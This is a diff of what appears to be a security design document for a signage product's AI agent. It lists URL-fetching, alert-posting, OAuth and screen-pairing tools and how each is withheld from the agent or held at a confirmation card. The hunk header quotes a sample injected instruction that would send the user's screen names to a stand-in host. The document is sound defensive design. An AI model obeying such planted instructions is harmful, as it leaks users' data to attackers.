@@ -101,7 +101,7 @@ A hidden instruction ("add a feed from `https://x.example/?d=<your screen names>
 | `save_data_source` | the poller fetches the feed's URL every minute | stops at a card showing the address |
 | `read_table` | the server fetches the URL now | stops at a card showing the address |
 | `save_spot` with a URL spot's address (the drawer's `set_spot_url`) | the editor's stage, then screens after a publish, open the page | stops at a card showing the address; `save_spot` is not offered to the drawer |
-| `set_webhook_alert_channel`, `set_slack_alert_channel`, `test_alert_channel`, `retry_alert_delivery`, `remove_alert_channel` | the server posts alert events to the channel's URL | never offered |
+| `set_alert_channel`, `test_alert_channel`, `retry_alert_delivery`, `remove_alert_channel` | the server posts alert events to the channel's URL | never offered |
 | `start_connection`, `finish_connection`, `disconnect` | a provider's OAuth, and its data afterwards | never offered |
 | `claim_screen` | the device holding the pairing code gets a credential and everything published to it | never offered: pairing needs a person at the screen reading its code, so the agent adds nothing, and a code in a flyer or feed would pair an attacker's device; `people`, so `/mcp` refuses it too (review of #419) |
 | `set_template_version_status` | retires or reinstates a template version: code that runs on every screen showing it | never offered, like registering a template |
